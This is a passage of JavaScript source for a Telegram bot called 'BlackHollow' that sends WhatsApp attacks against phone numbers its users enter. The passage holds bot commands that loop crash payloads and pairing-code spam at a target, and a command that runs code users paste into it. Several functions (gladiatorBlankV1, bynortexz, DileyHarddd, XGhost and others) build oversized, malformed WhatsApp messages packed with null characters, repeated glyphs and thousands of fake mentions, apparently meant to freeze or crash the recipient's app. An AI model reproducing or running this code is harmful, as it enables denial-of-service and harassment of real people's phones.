    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 7; i++) {
    await gladiatorBlankV1(sock, target);
    await blankmsg(sock, target);

  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Blank Document 
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xnew", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xnew 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Blank 5 Msg Andro
⌑ Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await blankmsg(sock, target);
    await sleep(2000);

  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Blank 5 Msg Andro
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xnew2", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xnew2 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Segera Datang
⌑ Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await ForcloClik(sock, target);

  }
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Segera Datang
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

async function pair(targetNumber) {
  const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestWaWebVersion
  } = require('@whiskeysockets/baileys')

  const P = require('pino')
  const fs = require('fs')

  const { version } = await fetchLatestWaWebVersion()
  const sessionDir = `.temp-session`
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir)

  const sock = makeWASocket({
    logger: P({ level: "silent" }),
    printQRInTerminal: false,
    auth: state,
    version: version,
    browser: ["Ubuntu", "Chrome", "20.0.00"],
    defaultQueryTimeoutMs: undefined,
    markOnlineOnConnect: false
  })

  if (sock.__keepalive) clearInterval(sock.__keepalive)
  sock.__keepalive = setInterval(() => {
    if (sock?.ws?.readyState === 1)
      sock.sendPresenceUpdate('available').catch(() => {})
  }, 30000)

  return new Promise((resolve, reject) => {
    sock.ev.on('connection.update', async (update) => {
      const { connection } = update

      if (connection === 'connecting') {
        await new Promise(r => setTimeout(r, 800))

        try {
          const code = await sock.requestPairingCode(targetNumber, '12345678')

          await new Promise(r => setTimeout(r, 500))
          try { fs.rmSync(sessionDir, { recursive: true, force: true }) } catch {}

          resolve(code)

        } catch (error) {
          try { fs.rmSync(sessionDir, { recursive: true, force: true }) } catch {}
          reject(error)
        }

      } else if (connection === 'close') {
        try { fs.rmSync(sessionDir, { recursive: true, force: true }) } catch {}
        reject(new Error('Koneksi ditutup'))
      }
    })

    sock.ev.on('creds.update', saveCreds)
  })
}

bot.command("xpair", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    const args = ctx.message.text.split(" ")
    const loopCount = parseInt(args[1])
    const targetNumber = (args[2] || "").replace(/[^0-9]/g, "")

    if (!args[1] || !args[2]) {
      return ctx.reply(`🪧 ☇ Format: /xpair 10 62×××`)
    }

    const processMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${targetNumber}
⌑ Type: Pair Spam
⌑ Loop : ${loopCount}
⌑ Status: Process`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${targetNumber}` }
          ]]
        }
      }
    )

    const processMessageId = processMessage.message_id

    let success = 0
    let fail = 0

    for (let i = 0; i < loopCount; i++) {

      try {
        await pair(targetNumber)
        success++
      } catch (e) {
        fail++
      }

      await new Promise(r => setTimeout(r, 3000))
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,

      `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${targetNumber}
⌑ Type: Pair Spam
⌑ Success: ${success}
⌑ Failed : ${fail}
⌑ Status: Finished`,

      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${targetNumber}` }
          ]]
        }
      }
    )

})

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

// FUNCTION
async function Qwerty(sock, target) {
await sock.relayMessage(target, {
   groupStatusMessageV2: {
      message: {
       interactiveResponseMessage: {
          header: {
            title: "\u0000" + "{{".repeat(250000)
          },
          body: {
            text: "Archive - Andros"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(400000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
        }
      }
    }
  }, { participant: { jid: target } });

  console.log("[/] Delay Sent Andros Bugs: " + target);
}
async function gladiatorBlankV1(sock, target) {
  const btns = [];
  btns.push({
    name: "single_select",
    buttonParamsJson: JSON.stringify({})
  });
  
  for (let i = 0; i < 20000; i++) {
    btns.push({
      name: "address_message",
      buttonParamsJson: JSON.stringify({ status: true })
    });
  }

  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: btns
          }
        }
      }
    }
  }, {
    messageId: null,
    participant: { jid: target }
  });

  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩".repeat(50000) + "ꦽ".repeat(50000),
        contentText: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩".repeat(50000) + "ꦾ".repeat(50000),
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          urlTrackingMap: {
            urlTrackingMapElements: [
              {
                originalUrl: "https://t.me/pherine" + "ꦽ".repeat(50000),
                unconsentedUsersUrl: "https://t.me/pherine" + "ꦽ".repeat(50000),
                consentedUsersUrl: "https://t.me/pherine" + "ꦽ".repeat(50000),
                cardIndex: 1,
              }
            ],
          },
          quotedMessage: {
            interactiveResponseMessage: {
              body: {
                text: "\u0000".repeat(5000),
                format: "EXTENSIONS_1"
              },
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: "{\"state\":\"" + "\u0000".repeat(900000) + "\"}",
                version: 3
              }
            }
          }
        }
      }
    }
  }, {
    messageId: null,
    participant: { jid: target }
  });

  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
            locationMessage: {
              degreesLatitude: 9.99999,
              degreesLongitude: -9.99999,
            },
            hasMediaAttachment: false,
          },
          extendedTextMessage: {
            text: "ꦽ".repeat(50000) + "ោ៝".repeat(50000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000),
                }),
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000),
                }),
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000),
                }),
              },
            ],
            messageParamsJson: "[{".repeat(10000),
          },
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 50000000) + "0@s.whatsapp.net"
              ),
            ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimeStamp: Date.now() + 1814400000,
              },
            },
          },
        },
      },
    },
  }, {
    messageId: null,
    participant: { jid: target }
  });

  await sock.relayMessage(target, {
    newsletterAdminInviteMessage: {
      newsletterJid: "0@newsletter",
      newsletterName: "ោ៝".repeat(25000),
      caption: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩" + 'ោ៝'.repeat(50000) + 'ꦾ'.repeat(25000) + "ោ៝".repeat(25000),
      inviteExpiration: "90000",
      contextInfo: {
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
      },
    },
  }, {
    messageId: null,
    participant: { jid: target }
  });
}

async function bynortexz(sock, target) {
  for (let i = 0; i < 2; i++) {
var cvx = [];
for (let v = 0; v < 3; v++) {
cvx.push({ body: { text: "\n".repeat(10) + "ꦾ".repeat(5000) }, footer: { text: "\n".repeat(10) }, header: { title: "©", hasMediaAttachment: true, imageMessage: { url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc", mimetype: "image/jpeg", fileSha256: Buffer.from("QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=", "base64"), fileLength: "999999999999999", height: 1, width: -1, mediaKey: Buffer.from("exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=", "base64"), fileEncSha256: Buffer.from("D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=", "base64"), directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc", mediaKeyTimestamp: 1755254367, jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"), imageSourceType: null
} },
nativeFlowMessage: { buttons: [
{ name: "single_select", buttonParamsJson: JSON.stringify({ display_text: "ោ៝".repeat(5000), id: null }) }, { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(10000), id: null }) }, { name: "review_and_pay", buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(10000) }) }, { name: "galaxy_message", buttonParamsJson: JSON.stringify({ flow_action: "navigate", flow_action_payload: { screen: "WELCOME_SCREEN" }, flow_cta: "ꦾ".repeat(10000), flow_id: "yeah, i know, i'm not perfect...", flow_message_version: "9", flow_token: "ПӨΣƧZYЦI! —" }) }, { 
name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(10000), copy_code: "ꦾ".repeat(10000) })
}, { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(10000), url: "https://t.me/NortexZ" })
}, { name: "request_location", buttonParamsJson: JSON.stringify({ type: "request_location", display_text: "ꦾ".repeat(10000), params: {} })
}, { 
name: "send_location",
buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(10000) })
}, ], contextInfo: { isForwarded: true, forwardingScore: 999 }
 }
 });
}
    const cv = generateWAMessageFromContent(target, {
      interactiveMessage: { header: { hasMediaAttachment: false }, body: { text: "ꦾ".repeat(26000) }, footer: { text: "ꦾ".repeat(5000) }, carouselMessage: { cards: cvx }, contextInfo: { stanzaId: null, quotedMessage: { conversation: "ꦾ".repeat(15000) }, remoteJid: "status@broadcast", mentionedJid: ["0@s.whatsapp.net"] }
      }
    }, { userJid: target, quoted: null });
    await sock.relayMessage(target, cv.message, {
      messageId: null,
      participant: { jid: target }
    });
await new Promise(i => setTimeout(i, 10));
await sock.relayMessage(target, cv.message, {
      messageId: null,
      participant: { jid: target }
    });
await new Promise(i => setTimeout(i, 750));
  }
}

async function DileyHarddd(sock, target) {
  const msg = generateWAMessageFromContent(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
                fileLength: "999999999999999",
                height: 99999,
                width: 99999,
                mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
                fileEncSha256: "hRGms7zMrcNR9LAAD3+eUy4QsgFV58gm9nCHaAYYu88=",
                directPath: "/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1755695348",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
                mediaKeyTimestamp: Math.floor(Date.now() / 1000).toString(),
                contactVcard: true,
                thumbnailDirectPath: `/v/t62.36145-24/${Math.floor(Math.random() * 1e18)}_${Math.floor(Math.random() * 1e18)}_n.enc?ccb=11-4&oh=${Math.random().toString(36).substring(2, 15)}&oe=${Math.random().toString(36).substring(2, 10)}&_nc_sid=${Math.random().toString(36).substring(2, 6)}`,
                thumbnailSha256: Buffer.from(crypto.randomBytes(32)).toString("base64"),
                thumbnailEncSha256: Buffer.from(crypto.randomBytes(32)).toString("base64"),
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
                thumbnailHeight: Math.floor(Math.random() * 1080),
                thumbnailWidth: Math.floor(Math.random() * 1920)
              },
              hasMediaAttachment: true
            },
            body: {
              text: " Kelra - Execute "
            },
            urlTrackingMap: {
              urlTrackingMapElements: [
                {
                  originalUrl: "https://t.me/FlavourKelraxx",
                  unconsentedUsersUrl: "https://t.me/FlavourKelraxx",
                  consentedUsersUrl: "https://t.me/FlavourKelraxx",
                  cardIndex: 1
                },
                {
                  originalUrl: "https://t.me/FlavourKelraxx",
                  unconsentedUsersUrl: "https://t.me/FlavourKelraxx",
                  consentedUsersUrl: "https://t.me/FlavourKelraxx",
                  cardIndex: 2
                }
              ]
            },
            nativeFlowMessage: {
              buttons: [
                { 
                  name: "single_select", 
                  buttonParamsJson: "X" 
                },
                { 
                  name: "galaxy_message", 
                  buttonParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}"
                },
                { 
                  name: "call_permission_message", 
                  buttonParamsJson: "\x10".repeat(10000)
                }
              ],
              messageParamsJson:
                " kelra - execute " +
                "\u0000".repeat(900000)
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
              ],
              forwardingScore: 999999,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: { 
                conversation: " X " 
              }
            }
          }
        }
      }
    },
    {}
  )

  await sock.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  })

  if (msg) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {})
  }
}

async function fcinvis(sock, target) {
  const xryy = {
   groupStatusMessageV2: {
     message: {
       stickerMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
         fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
         fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
         mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
         mimetype: "image/webp",
         directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
         fileLength: "10610",
         mediaKeyTimestamp: "1775044724",
         stickerSentTs: "1775044724091"
         }
       }
     }
  }

   const xryy2 = {
    viewOnceMessageV2: {
      message: {
        messageContextInfo: {
          mentionedJid: [target]
        },
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/placeholder.mp4",
          mimetype: "video/mp4",
          caption:
            "xryy 2 menit viral" +
            "꧀".repeat(50000) +
            "\u0000".repeat(900000),
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          fileLength: "9999",
          seconds: 20000,
          directPath: "/v/t62.7161-24/fakepath",
          mediaKeyTimestamp: "1775044724"
        }
      }
    }
  };

  
  const msg = generateWAMessageFromContent(target, xryy, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
    message: msg.message
  }},
  {
   messageId: msg.key.id,
   participant: { jid: target }
  });

   const msg1 = generateWAMessageFromContent(target, xryy2, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
    message: msg1.message
  }},
  {
   messageId: msg1.key.id,
   participant: { jid: target }
  });

  await new Promise((r) => setTimeout(r, 1500));
}

async function XGhost(sock, target) {
    try {
        for (let i = 0; i < 5; i++) {
            const msg1 = await generateWAMessageFromContent(target, {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: 't.me/JesterNovaZ'
                            },
                            nativeFlowResponseMessage: {
                                name: (["address_message", "call_permission_request", "galaxy_message"][(i + (Math.random() < 0.5 ? 1 : 0)) % 3]),
                                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(999999)}\"}`,
                                version: 3
                            }
                        }
                    }
                }
            }, {
                userJid: target
            })

            const msg2 = await generateWAMessageFromContent(target, {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: 't.me/JesterNovaZ'
                            },
                            nativeFlowResponseMessage: {
                                name: (["address_message", "call_permission_request", "galaxy_message"][(i + (Math.random() < 0.5 ? 1 : 0)) % 3]),
                                paramsJson: `{\"flow_cta\":\"${"\x10".repeat(999999)}\"}`,
                                version: 3
                            }
                        }
                    }
                }
            }, {
                userJid: target
            })

            for (const msg of [msg1, msg2]) {
                await sock.relayMessage(
                    "status@broadcast",
                    msg, {
                        messageId: null,
                        statusJidList: [target],
                        additionalNodes: [{
                            tag: "meta",
                            attrs: {},
                            content: [{
                                tag: "mentioned_users",
                                attrs: {},
                                content: [{
                                    tag: "to",
                                    attrs: {
                                        jid: target
                                    }
                                }]
                            }]
                        }]
                    }
                );
            }
        }
    } catch (error) {
        console.log(`[ Error Function XGhosy ] : ${error.message}`)
    }
}

async function stcPckx(sock, jid) {  
  const msg = generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
          name: "ꦾ".repeat(50000),
          publisher: "ꦾ".repeat(50000),
          caption: " obito`impõssible. ",
          stickers: [
            ...Array.from({ length: 100 }, () => ({
              fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
              isAnimated: false,
              emojis: ["🦠", "🩸"],
              accessibilityLabel: "",
              stickerSentTs: "fuck-ID-msg",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            }))
          ],
          fileLength: "1073741824000",
          fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
          fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
          mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
          directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4",
          contextInfo: {
            remoteJid: "X",
            participant: "0@s.whatsapp.net",
            stanzaId: "1234567890ABCDEF",
            mentionedJid: [
              jid,
              ...Array.from(
                { length: 1950 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 9999999) +
                  "@s.whatsapp.net"
              ),
            ],
          },
          packDescription: "",
          mediaKeyTimestamp: "1747502082",
          trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
          thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4",
          thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
          thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
          thumbnailHeight: 252,
          thumbnailWidth: 252,
